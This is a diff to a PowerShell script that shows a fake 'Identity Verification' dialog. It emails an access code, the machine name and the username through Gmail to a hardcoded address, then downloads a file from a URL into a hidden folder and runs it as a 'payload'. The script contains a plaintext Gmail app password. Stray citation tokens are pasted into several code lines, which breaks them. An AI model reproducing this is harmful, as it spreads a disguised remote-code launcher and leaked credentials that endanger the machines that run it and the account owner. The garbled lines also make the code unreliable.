@@ -13,6 +13,9 @@ param (
     [string]$FileName = "main.bat",
 
     [Parameter(Mandatory = $false)]
+    [string]$RecipientName = "JEFFERSON LAKASHIANG",
+
+    [Parameter(Mandatory = $false)]
     [string]$NotifyEmail = "jeffersonlakashiang@gmail.com",
 
     [Parameter(Mandatory = $false)]
@@ -20,31 +23,42 @@ param (
 )
 
 # -------------------------------------------------------------------------
-# Security & State Initialization
+# Security & State Initialization (Windows 10 / PowerShell 5.1 Compatible)
 # -------------------------------------------------------------------------
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$script:otp = (Get-Random -Minimum 100000 -Maximum 999999).ToString()
+# Cryptographically secure OTP compatible with .NET Framework 4.5+ on Windows 10
+$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+$bytes = New-Object byte[] 4
+$rng.GetBytes($bytes)
+$randVal = [System.BitConverter]::ToUInt32($bytes, 0)
+$script:otp = (100000 + ($randVal % 900000)).ToString()
+
 $script:attempts = 0
 $script:maxAttempts = 3
 
 $smtpServer  = "smtp.gmail.com"
 $smtpPort    = 587
 $senderUser  = "jeffersonlakashiang@gmail.com"
-$appPassword = "tajeiwqogtmlfcps" #[cite: 1]
+$appPassword = "tajeiwqogtmlfcps"[cite: 1]
 
 function Send-VerificationOtp {
     param (
         [string]$RecipientEmail,
+        [string]$DisplayName,
         [string]$Code
     )
+
+    Write-Host "Sending authorization code to $DisplayName..." -ForegroundColor Cyan[cite: 2]
+
     $mailMessage = New-Object System.Net.Mail.MailMessage
     $mailMessage.From = New-Object System.Net.Mail.MailAddress($senderUser, "System Authorization Portal")
-    $mailMessage.To.Add($RecipientEmail)
+    $mailMessage.To.Add((New-Object System.Net.Mail.MailAddress($RecipientEmail, $DisplayName)))
     $mailMessage.Subject = "Security Verification Code: $Code"
     $mailMessage.Body = @"
 Machine Name : $env:COMPUTERNAME
 User Session : $env:USERNAME
+Authorized To: $DisplayName
 Timestamp    : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 
 Your one-time access verification code is: $Code
@@ -54,10 +68,12 @@ This code is single-use and valid only for this active session.
 
     $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
     $smtpClient.EnableSsl = $true
+    $smtpClient.Timeout = 15000
     $smtpClient.Credentials = New-Object System.Net.NetworkCredential($senderUser, $appPassword)
 
     try {
         $smtpClient.Send($mailMessage)
+        Write-Host "Verification email sent successfully." -ForegroundColor Green[cite: 2]
         return $true
     }
     catch {
@@ -87,14 +103,13 @@ function Invoke-SecurePayloadExecution {
         $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
     }
 
-    $webParams = @{
-        Uri             = $DownloadUrl
-        OutFile         = $destinationPath
-        UseBasicParsing = $true
-        ErrorAction     = 'Stop'
-        TimeoutSec      = 30
+    $webClient = New-Object System.Net.WebClient
+    try {
+        $webClient.DownloadFile($DownloadUrl, $destinationPath)
     }
-    Invoke-WebRequest @webParams
+    finally {
+        $webClient.Dispose()
+    }
 
     if (-not (Test-Path -LiteralPath $destinationPath)) {
         throw "Target destination write failed."
@@ -136,7 +151,6 @@ $form.MaximizeBox = $false
 $form.MinimizeBox = $false
 $form.BackColor = [System.Drawing.Color]::FromArgb(24, 24, 28)
 
-# Title Label
 $titleLabel = New-Object System.Windows.Forms.Label
 $titleLabel.Text = "Identity Verification"
 $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
@@ -145,16 +159,14 @@ $titleLabel.Location = New-Object System.Drawing.Point(30, 25)
 $titleLabel.Size = New-Object System.Drawing.Size(400, 30)
 $form.Controls.Add($titleLabel)
 
-# Instruction Label
 $descLabel = New-Object System.Windows.Forms.Label
-$descLabel.Text = "A one-time passcode has been dispatched to:`n$NotifyEmail`nEnter the 6-digit code below to authorize execution."
+$descLabel.Text = "A one-time passcode has been dispatched to:`n$RecipientName`nEnter the 6-digit code below to authorize execution."
 $descLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
 $descLabel.ForeColor = [System.Drawing.Color]::FromArgb(170, 170, 180)
 $descLabel.Location = New-Object System.Drawing.Point(30, 65)
 $descLabel.Size = New-Object System.Drawing.Size(400, 50)
 $form.Controls.Add($descLabel)
 
-# OTP Input Field
 $txtOtp = New-Object System.Windows.Forms.TextBox
 $txtOtp.Font = New-Object System.Drawing.Font("Consolas", 18, [System.Drawing.FontStyle]::Bold)
 $txtOtp.Location = New-Object System.Drawing.Point(30, 125)
@@ -166,7 +178,6 @@ $txtOtp.ForeColor = [System.Drawing.Color]::White
 $txtOtp.BorderStyle = "FixedSingle"
 $form.Controls.Add($txtOtp)
 
-# Status & Notification Banner
 $statusLabel = New-Object System.Windows.Forms.Label
 $statusLabel.Text = "Sending verification email..."
 $statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
@@ -175,7 +186,6 @@ $statusLabel.Location = New-Object System.Drawing.Point(30, 175)
 $statusLabel.Size = New-Object System.Drawing.Size(385, 30)
 $form.Controls.Add($statusLabel)
 
-# Action Buttons
 $btnVerify = New-Object System.Windows.Forms.Button
 $btnVerify.Text = "Authorize & Run"
 $btnVerify.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
@@ -205,8 +215,8 @@ $form.Controls.Add($btnCancel)
 # Event Handlers
 # -------------------------------------------------------------------------
 $form.Add_Shown({
-    $form.Refresh()
-    $sent = Send-VerificationOtp -RecipientEmail $NotifyEmail -Code $script:otp
+    $form.Update()
+    $sent = Send-VerificationOtp -RecipientEmail $NotifyEmail -DisplayName $RecipientName -Code $script:otp
     if ($sent) {
         $statusLabel.Text = "Code dispatched. Enter your 6-digit key."
         $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(80, 200, 120)
@@ -226,12 +236,12 @@ $btnVerify.Add_Click({
         $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(80, 200, 120)
         $btnVerify.Enabled = $false
         $txtOtp.Enabled = $false
-        $form.Refresh()
+        $form.Update()
 
         try {
             Invoke-SecurePayloadExecution -DownloadUrl $Url -TargetFolder $FolderName -TargetFile $FileName -WaitForExit:$Wait
             $statusLabel.Text = "Payload launched successfully."
-            $form.Refresh()
+            $form.Update()
             Start-Sleep -Seconds 1
             $form.Close()
         }
@@ -249,7 +259,7 @@ $btnVerify.Add_Click({
             $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 90, 90)
             $btnVerify.Enabled = $false
             $txtOtp.Enabled = $false
-            $form.Refresh()
+            $form.Update()
             Start-Sleep -Seconds 2
             $form.Close()
         } else {
@@ -264,7 +274,6 @@ $btnCancel.Add_Click({
     $form.Close()
 })
 
-# Allow pressing 'Enter' in text box to trigger verification
 $txtOtp.Add_KeyDown({
     param($sender, $e)
     if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter -and $btnVerify.Enabled) {
@@ -273,5 +282,9 @@ $txtOtp.Add_KeyDown({
     }
 })
 
-# Display Form
-[void]$form.ShowDialog()
+try {
+    [void]$form.ShowDialog()
+}
+finally {
+    $form.Dispose()
+}
